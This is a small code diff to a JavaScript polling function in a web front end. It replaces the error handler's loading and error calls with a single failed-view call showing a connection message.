@@ -1038,12 +1038,11 @@ async function pollOperator() {
     const data = await response.json();
     console.log("Polling:", data);
     if (data.currentStatus) updateUIForStatus(data.currentStatus, data.data || {});
-  } catch (error) {
+} catch (error) {
     console.error("Polling error:", error);
     clearInterval(pollingIntervalId);
-    hideLoading();
-    setError('loadingError', "Connection issue. Please check your internet and try again.");
-  }
+    showFailedView('Connection issue. Please check your internet and try again.');
+}
 }
 
 // ==================== STATUS UI ====================
